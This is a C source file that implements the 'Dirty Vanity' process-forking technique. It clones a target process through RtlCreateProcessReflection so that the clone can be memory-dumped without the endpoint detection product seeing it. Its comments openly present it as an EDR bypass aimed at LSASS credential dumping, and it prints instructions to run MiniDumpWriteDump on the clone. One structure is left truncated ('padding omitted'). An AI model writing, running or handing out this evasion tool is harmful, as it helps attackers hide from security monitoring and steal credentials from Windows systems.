#include <windows.h>
#include <stdio.h>

#pragma comment(lib, "ntdll.lib")

// Dirty Vanity - EDR Evasion via Process Forking
// This technique avoids touching the target process's memory (no PROCESS_VM_READ).
// Instead, it asks the kernel to clone the process. The clone is not monitored by the EDR.

#define RTL_CLONE_PROCESS_FLAGS_CREATE_SUSPENDED 0x00000001
#define RTL_CLONE_PROCESS_FLAGS_INHERIT_HANDLES 0x00000002
#define RTL_CLONE_PROCESS_FLAGS_NO_SYNCHRONIZE 0x00000004

typedef struct _CLIENT_ID {
    HANDLE UniqueProcess;
    HANDLE UniqueThread;
} CLIENT_ID, *PCLIENT_ID;

typedef struct _RTL_USER_PROCESS_INFORMATION {
    ULONG Length;
    HANDLE Process;
    HANDLE Thread;
    CLIENT_ID ClientId;
    // ... padding omitted
} RTL_USER_PROCESS_INFORMATION, *PRTL_USER_PROCESS_INFORMATION;

typedef NTSTATUS(NTAPI* fnRtlCreateProcessReflection)(
    HANDLE ProcessHandle,
    ULONG Flags,
    PVOID StartRoutine,
    PVOID StartContext,
    HANDLE EventHandle,
    PRTL_USER_PROCESS_INFORMATION ReflectionInformation
);

int main(int argc, char** argv) {
    if (argc < 2) {
        printf("Usage: %s <PID>\n", argv[0]);
        return -1;
    }

    DWORD targetPid = atoi(argv[1]);
    printf("[+] Target PID: %lu\n", targetPid);

    // 1. We ONLY request PROCESS_CREATE_PROCESS. 
    // This is the critical bypass. EDRs block PROCESS_VM_READ on LSASS, but often allow CREATE_PROCESS.
    HANDLE hProcess = OpenProcess(PROCESS_CREATE_PROCESS, FALSE, targetPid);
    if (!hProcess) {
        printf("[-] Failed to open process with PROCESS_CREATE_PROCESS. Error: %lu\n", GetLastError());
        return -1;
    }

    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    fnRtlCreateProcessReflection pRtlCreateProcessReflection = 
        (fnRtlCreateProcessReflection)GetProcAddress(hNtdll, "RtlCreateProcessReflection");

    if (!pRtlCreateProcessReflection) {
        printf("[-] Failed to resolve RtlCreateProcessReflection.\n");
        CloseHandle(hProcess);
        return -1;
    }

    RTL_USER_PROCESS_INFORMATION cloneInfo = { 0 };
    cloneInfo.Length = sizeof(RTL_USER_PROCESS_INFORMATION);

    printf("[+] Forking process via RtlCreateProcessReflection...\n");
    
    // 2. The kernel creates a perfect, suspended clone using Copy-On-Write.
    NTSTATUS status = pRtlCreateProcessReflection(
        hProcess,
        RTL_CLONE_PROCESS_FLAGS_CREATE_SUSPENDED | RTL_CLONE_PROCESS_FLAGS_NO_SYNCHRONIZE,
        NULL,
        NULL,
        NULL,
        &cloneInfo
    );

    if (status >= 0) { 
        printf("[!] Fork successful!\n");
        printf("[!] Clone PID: %lu\n", (DWORD)(ULONG_PTR)cloneInfo.ClientId.UniqueProcess);
        
        // 3. The clone is NOT protected by the EDR's ObRegisterCallbacks because it's a new, unknown process.
        // We can now read its memory freely.
        printf("[+] You can now safely use MiniDumpWriteDump on the clone PID.\n");
        printf("[+] Press Enter to kill the clone and exit...\n");
        getchar();

        // 4. Clean up the zombie clone
        TerminateProcess(cloneInfo.Process, 0);
        CloseHandle(cloneInfo.Process);
        CloseHandle(cloneInfo.Thread);
    } else {
        printf("[-] Fork failed. NTSTATUS: 0x%08X\n", status);
    }

    CloseHandle(hProcess);
    return 0;
}